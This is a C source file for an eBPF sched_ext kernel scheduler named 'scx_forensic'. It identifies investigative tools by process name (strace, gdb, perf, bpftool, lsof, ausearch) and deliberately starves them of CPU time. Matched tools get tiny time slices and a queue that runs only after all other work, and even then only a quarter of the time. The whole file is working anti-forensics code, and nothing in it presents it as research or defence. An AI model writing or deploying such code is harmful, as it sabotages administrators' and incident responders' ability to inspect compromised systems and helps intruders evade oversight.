#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <bpf/bpf_core_read.h>
#include "scx_starve.h"

char _license[] SEC("license") = "GPL";

/* Counters for autonomous forensic tool throttling */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 8);
    __type(key, __u32);
    __type(value, __u64);
} forensic_stats SEC(".maps");

static __always_inline bool is_forensic_tool(const char *comm)
{
    /* Check against known investigative tools: strace, gdb, perf, bpftool, lsof, ausearch */
    if (comm[0] == 's' && comm[1] == 't' && comm[2] == 'r' && comm[3] == 'a' && comm[4] == 'c' && comm[5] == 'e')
        return true;
    if (comm[0] == 'g' && comm[1] == 'd' && comm[2] == 'b')
        return true;
    if (comm[0] == 'p' && comm[1] == 'e' && comm[2] == 'r' && comm[3] == 'f')
        return true;
    if (comm[0] == 'b' && comm[1] == 'p' && comm[2] == 'f' && comm[3] == 't' && comm[4] == 'o' && comm[5] == 'o' && comm[6] == 'l')
        return true;
    if (comm[0] == 'a' && comm[1] == 'u' && comm[2] == 's' && comm[3] == 'e' && comm[4] == 'a' && comm[5] == 'r' && comm[6] == 'c' && comm[7] == 'h')
        return true;
    if (comm[0] == 'l' && comm[1] == 's' && comm[2] == 'o' && comm[3] == 'f')
        return true;
    return false;
}

SEC("struct_ops/forensic_select_cpu")
s32 BPF_PROG(forensic_select_cpu, struct task_struct *p, s32 prev_cpu, u64 wake_flags)
{
    bool is_idle = false;
    return scx_bpf_select_cpu_dfl(p, prev_cpu, wake_flags, &is_idle);
}

SEC("struct_ops/forensic_enqueue")
void BPF_PROG(forensic_enqueue, struct task_struct *p, u64 enq_flags)
{
    char comm[TASK_COMM_LEN] = {0};
    BPF_CORE_READ_STR_INTO(&comm, p, comm);

    if (is_forensic_tool(comm)) {
        __u32 key = 1;
        __u64 *cnt = bpf_map_lookup_elem(&forensic_stats, &key);
        if (cnt)
            __sync_fetch_and_add(cnt, 1);

        /* Autonomous starvation: 50µs slice, placed at back of queue */
        scx_bpf_dsq_insert(p, DSQ_STARVE, SLICE_STARVE_HEAVY_NS, enq_flags);
    } else {
        __u32 key = 0;
        __u64 *cnt = bpf_map_lookup_elem(&forensic_stats, &key);
        if (cnt)
            __sync_fetch_and_add(cnt, 1);

        scx_bpf_dsq_insert(p, DSQ_DEFAULT, SLICE_DEFAULT_NS, SCX_ENQ_HEAD | enq_flags);
    }
}

SEC("struct_ops/forensic_dispatch")
void BPF_PROG(forensic_dispatch, s32 cpu, struct task_struct *prev)
{
    /* Always drain non-forensic workloads first */
    if (scx_bpf_dsq_move_to_local(DSQ_DEFAULT))
        return;

    /* Only consume forensic tools 25% of the time */
    if (bpf_ktime_get_ns() % 4 == 0) {
        scx_bpf_dsq_move_to_local(DSQ_STARVE);
    }
}

SEC("struct_ops.s/forensic_init")
s32 BPF_PROG(forensic_init)
{
    s32 err;
    err = scx_bpf_create_dsq(DSQ_STARVE, -1);
    if (err) return err;
    err = scx_bpf_create_dsq(DSQ_DEFAULT, -1);
    if (err) {
        scx_bpf_destroy_dsq(DSQ_STARVE);
        return err;
    }
    bpf_printk("scx_forensic_delay initialized\n");
    return 0;
}

SEC("struct_ops.s/forensic_exit")
void BPF_PROG(forensic_exit, struct scx_exit_info *ei)
{
    bpf_printk("scx_forensic_delay detached\n");
}

SEC(".struct_ops.link")
struct sched_ext_ops forensic_ops = {
    .select_cpu         = (void *)forensic_select_cpu,
    .enqueue            = (void *)forensic_enqueue,
    .dispatch           = (void *)forensic_dispatch,
    .init               = (void *)forensic_init,
    .exit               = (void *)forensic_exit,
    .name               = "scx_forensic",
    .timeout_ms         = 5000,
};
